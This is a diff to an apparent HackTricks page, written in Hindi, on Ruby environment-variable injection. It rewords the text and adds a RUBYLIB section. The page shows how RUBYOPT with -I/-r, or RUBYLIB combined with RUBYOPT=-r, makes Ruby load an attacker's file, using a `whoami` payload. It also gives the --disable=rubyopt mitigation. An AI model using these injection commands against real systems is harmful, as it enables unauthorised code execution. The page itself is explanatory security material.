@@ -4,13 +4,13 @@
 
 ## RUBYOPT
 
-Ruby किसी script को चलाने से पहले `RUBYOPT` environment variable से समर्थित command-line switches को parse करता है। Ruby `RUBYOPT` में `-e` के माध्यम से code execution को अस्वीकार करता है, लेकिन `-I` किसी library-search directory को सबसे आगे जोड़ सकता है और `-r` किसी library की आवश्यकता कर सकता है। इसलिए, attacker-controlled environment variables के साथ Ruby launch करने वाली process को attacker-controlled Ruby code load करने के लिए बाध्य किया जा सकता है।<sup>[[1]](#references)</sup>
+Ruby script चलाने से पहले `RUBYOPT` environment variable से supported command-line switches को parse करता है। Ruby, `RUBYOPT` में `-e` के माध्यम से code execution को अस्वीकार करता है, लेकिन `-I` किसी library-search directory को prepend कर सकता है और `-r` किसी library को require कर सकता है। इसलिए, जो process attacker-controlled environment variables के साथ Ruby लॉन्च करता है, उसे attacker-controlled Ruby code load करने के लिए मजबूर किया जा सकता है।<sup>[[1]](#references)</sup>
 
 `/tmp/inject.rb` बनाएं:
 ```ruby:inject.rb
 puts `whoami`
 ```
-`hello.rb` जैसा एक सुरक्षित Ruby script बनाएँ:
+एक सुरक्षित Ruby script बनाएँ, जैसे `hello.rb`:
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
@@ -18,7 +18,7 @@ puts 'Hello, World!'
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-इस व्यवहार को अक्षम करने के लिए, script name से **पहले** `--disable=rubyopt` (या `--disable-rubyopt`) पास करें:<sup>[[1]](#references)</sup>
+इस behavior को disable करने के लिए, script name से **पहले** `--disable=rubyopt` (या `--disable-rubyopt`) पास करें:<sup>[[1]](#references)</sup>
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
 ```
@@ -27,7 +27,14 @@ RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
 # This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
+## RUBYLIB
+
+`RUBYOPT` के अंदर `-I` के साथ load directory को prepend करने के बजाय, अलग `RUBYLIB` environment variable Ruby के `$LOAD_PATH` में directories जोड़ता है। `RUBYOPT=-r<module>` के साथ मिलकर, यह `RUBYOPT` में `-I` की आवश्यकता के बिना attacker code को load करता है:<sup>[[1]](#references)</sup>
+```bash
+echo "puts \`whoami\`" > /tmp/inject.rb
+RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
+```
 ## References
 
-- [1] [Ruby दस्तावेज़ीकरण - Ruby कमांड-लाइन विकल्प](https://ruby-doc.org/3.4/ruby/options_md.html)
+- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
 {{#include ../../../banners/hacktricks-training.md}}
